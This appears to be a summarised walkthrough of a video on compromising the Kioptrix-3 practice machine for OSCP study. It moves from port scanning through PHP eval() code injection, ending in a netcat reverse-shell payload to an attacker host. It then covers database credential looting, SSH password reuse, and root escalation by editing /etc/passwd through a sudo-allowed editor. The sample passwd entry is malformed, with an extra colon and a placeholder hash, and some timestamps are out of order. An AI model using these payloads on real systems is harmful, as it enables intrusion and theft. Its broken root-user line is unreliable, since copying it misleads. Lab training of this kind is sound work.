This walkthrough for the **Kioptrix-3** machine is an excellent resource for OSCP exam preparation, covering crucial concepts like web application code injection, credential reuse, and improper `sudo` configuration for privilege escalation.

Here are the comprehensive notes and all major commands used in the video, structured by the key phases of the penetration test.

-----

## 1\. Initial Enumeration & Service Discovery

The first step is always to identify open ports and running services. The host IP for Kioptrix 3 is set up with a custom hostname entry (`/etc/hosts`) as `kioptrix-3`.

| Tool | Command | Purpose | Findings |
| :--- | :--- | :--- | :--- |
| **Nmap** | `nmap -p- -sV -sC --open <TARGET_IP>` [[29:20](http://www.youtube.com/watch?v=Bkp3n___dko&t=1760)] | Scan all ports, detect service versions, run default scripts, and only show open ports. | **Port 22 (SSH)** (OpenSSH 4.7p1), **Port 80 (HTTP)** (Apache 2.2.8), **PHP 5.2.4**, OS: **Debian/Ubuntu**. |
| **Nikto** | `nikto --host <TARGET_URL> -c all` [[01:20:02](http://www.youtube.com/watch?v=Bkp3n___dko&t=4802)] | Scan the web server for common vulnerabilities and configuration issues. | Confirms PHP and Apache versions, and reveals the **X-Powered-By** header. |
| **Wfuzz** | `wfuzz -c -z file,/path/to/wordlist/directories.txt --hc 404 <TARGET_URL>/FUZZ/` | Directory brute-forcing. | Reveals paths like `/gallery` and **`/phpmyadmin`** [[37:26](http://www.youtube.com/watch?v=Bkp3n___dko&t=2246)]. |

-----

## 2\. Web Application Analysis & Initial Foothold (RCE)

The Apache web server on port 80 hosts a **Lotus CMS** application.

### Key Finding: Credential & User Hunting

  * Inspecting the website blog section reveals a user: **`lone ferret`** [[43:52](http://www.youtube.com/watch?v=Bkp3n___dko&t=2632)].

### Vulnerability: PHP Code Injection via `eval()`

The exploit suggests a vulnerability in the CMS's router function, specifically exploiting a **Code Injection** flaw in the `page` parameter which feeds directly into the PHP `eval()` function [[55:15](http://www.youtube.com/watch?v=Bkp3n___dko&t=3315)].

#### Concepts: Code Injection vs. Command Injection

  * **Code Injection:** Injecting and executing *programming language code* (e.g., PHP, Python, Ruby) into an application. The flaw here involves the dangerous PHP function `eval()`. [[01:00:01](http://www.youtube.com/watch?v=Bkp3n___dko&t=3601)]
  * **Command Injection:** Injecting and executing *operating system commands* (e.g., `ls`, `ping`, `system()`) via a web application interface.

#### Exploitation Technique

1.  **Trigger the Error:** Inputting a single apostrophe (`'`) in the `page` parameter confirms an error message referencing the `eval` function in **`router.php`**. [[55:15](http://www.youtube.com/watch?v=Bkp3n___dko&t=3315)]
2.  **Payload Construction:** The goal is to use PHP syntax to:
      * Terminate the original code block.
      * Inject the malicious PHP function (e.g., `system()` for command execution).
      * Use a URL-encoded pound sign (`%23` or `#`) to comment out the remainder of the vulnerable code, preventing a syntax error. [[01:09:32](http://www.youtube.com/watch?v=Bkp3n___dko&t=4172)]

#### Reverse Shell Commands

1.  **Netcat Listener (Attacker Machine):**

    ```bash
    nc -nlvp 9090 
    ```

2.  **The Code Injection Payload (In BurpSuite Repeater, via POST data):**
    The payload below uses the PHP `system()` function to execute a command, which is a Netcat reverse shell connection to the attacker's IP and listener port.

      * **Final Working Payload Structure:**
        ```
        page=index');system('nc+<ATTACKER_IP>+9090+-e+/bin/bash');#
        ```
        *(The final execution of this payload on the target results in a low-privilege shell as user `www-data`)* [[01:13:12](http://www.youtube.com/watch?v=Bkp3n___dko&t=4392)]

3.  **TTY Breakout (to stabilize the shell):**

    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    stty raw -echo
    fg
    reset
    export TERM=linux
    ```

    *(This sequence is used to get an interactive, stable shell)* [[01:11:47](http://www.youtube.com/watch?v=Bkp3n___dko&t=4307)]

-----

## 3\. Post-Exploitation & Lateral Movement (SSH)

After gaining the initial shell as `www-data`, the next phase is to find credentials for a higher-privileged user or service.

### Credential Discovery (DB Configuration)

  * **Internal Service:** `netstat -antp` reveals a local-only MySQL database running on **127.0.0.1:3306** [[01:20:09](http://www.youtube.com/watch?v=Bkp3n___dko&t=4809)].
  * **Search for Creds:** Recursively search the web root for common keywords like "sql".
    ```bash
    grep -r -i sql /home/kioptrix/www/kioptrix3/ 
    ```
  * **DB Login:** The search reveals the MySQL root user password from a configuration file.
    ```bash
    mysql -u root -p
    ```
  * **Loot:** Inside the `gallery` database, the `dev_accounts` table contains two hashed passwords [[01:23:06](http://www.youtube.com/watch?v=Bkp3n___dko&t=4986)]:
      * **dredge** (Password cracked to **`master`**)
      * **loneferret** (Password cracked to **`starwars`**)

### Secure Shell (SSH) Access

  * Using the cracked credentials, the user can now establish a persistent, stable session.
    ```bash
    ssh loneferret@<TARGET_IP>
    # Password: starwars
    ```
    *(This provides a better shell than the previous TTY breakout)* [[01:26:37](http://www.youtube.com/watch?v=Bkp3n___dko&t=5197)]

-----

## 4\. Privilege Escalation (Sudo Misconfiguration)

The final step is to escalate privileges from `loneferret` to **root**.

1.  **Sudo Check:** Check what commands the user `loneferret` can execute with `sudo`.

    ```bash
    sudo -l
    ```

      * **Finding:** The user can execute the editor **`/usr/local/bin/ht`** without a password (`NOPASSWD`). [[01:28:07](http://www.youtube.com/watch?v=Bkp3n___dko&t=5287)]

2.  **Exploiting the Editor:** When a user can run a file editor with `sudo` privileges, they can modify critical system files.

      * **Target File:** `/etc/passwd` (The file that defines system users and is readable/writable by root).
      * **Action:** Modify `/etc/passwd` to add a new user with a root (UID 0, GID 0) entry and a known password hash. [[01:32:00](http://www.youtube.com/watch?v=Bkp3n___dko&t=5520)]

    <!-- end list -->

    ```bash
    sudo /usr/local/bin/ht /etc/passwd 
    ```

3.  **Password Hash Generation (Example):**
    *(The hash below is an example of an SHA-512 hash (`$6$`) for the password `iheartkacking`)*

    ```bash
    siren:$6$e0X9o6F5$iX0d5c0/B/fD/5h3v0K4lR1j2k9q2W9X4G0Y1Z3k4K6S5P3Q2R1E0N1::0:0:Root User:/root:/bin/bash
    ```

      * Insert a line like the example above (with a valid, known hash) into `/etc/passwd`, replacing an existing entry or adding a new one with `0:0` to grant root privileges.

4.  **Final Root Access:**

      * Switch to the newly created root user using the corresponding password.

    <!-- end list -->

    ```bash
    su siren 
    # Password: iheartkacking (or the password used for your hash)
    ```

      * Confirm root access.

    <!-- end list -->

    ```bash
    id
    # uid=0(root) gid=0(root) groups=0(root)
    ```

    *(The final confirmation of root access is at [[01:34:18](http://www.youtube.com/watch?v=Bkp3n___dko&t=5658)])*

-----

## Additional Resources

The video is the 21st in the playlist, which can be found here:

[Kioptrix-3 Walkthrough with S1REN](http://www.youtube.com/watch?v=Bkp3n___dko)
http://googleusercontent.com/youtube_content/0